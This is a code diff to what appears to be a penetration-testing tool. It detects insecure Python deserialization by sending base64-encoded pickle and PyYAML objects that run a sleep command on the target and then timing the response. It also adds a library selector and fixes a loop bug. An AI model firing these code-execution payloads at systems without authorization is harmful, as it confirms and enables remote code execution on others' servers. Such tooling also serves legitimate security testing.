@@ -176,7 +176,7 @@ class pysleep_payload():
 
         
 
-def generate_payload() -> list[str]: # todo: nadodati na postojeci pickle objekt
+def generate_payload() -> list[str]:
 
     print("[+] Using generate-payload module")
 
@@ -387,16 +387,25 @@ def confirm_vuln():
     # list of payloads(different pickle protocols, different modules for rce/executing sleep)
     #todo: test with some prepickled sleep/timeout payloads
     payloads_list = []
-    payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time))).decode("utf-8"))
-    payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+1))).decode("utf-8"))
-    payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+2))).decode("utf-8"))
+    if g_args.lib == 'pickle' or g_args.lib == 'all' or g_args.lib is None:
+        payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time))).decode("utf-8"))
+        payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+1))).decode("utf-8"))
+        payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+2))).decode("utf-8"))
+        payloads_list.extend(utils.win_sleep5_prepickled)
+    
+    if g_args.lib == 'pyyaml' or g_args.lib == 'all':
+        payloads_list.append(base64.b64encode(yaml.dump(pysleep_payload(sleep_time)).encode("utf-8")).decode("utf-8"))
+        payloads_list.append(base64.b64encode(yaml.dump(pysleep_payload(sleep_time+1)).encode("utf-8")).decode("utf-8"))
+        payloads_list.append(base64.b64encode(yaml.dump(pysleep_payload(sleep_time+2)).encode("utf-8")).decode("utf-8"))
+
+  
     payloads_list.extend(generate_payload_silent(f"sleep {sleep_time}"))
-    payloads_list.extend(utils.win_sleep5_prepickled)
+    
     
 
 
     print("[+] Testing ...")
-    for payload in enumerate(payloads_list):
+    for payload in payloads_list:
         (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
         req = Request(method=method, url=url, headers=headers, data=data)
         prepared_req = req.prepare()
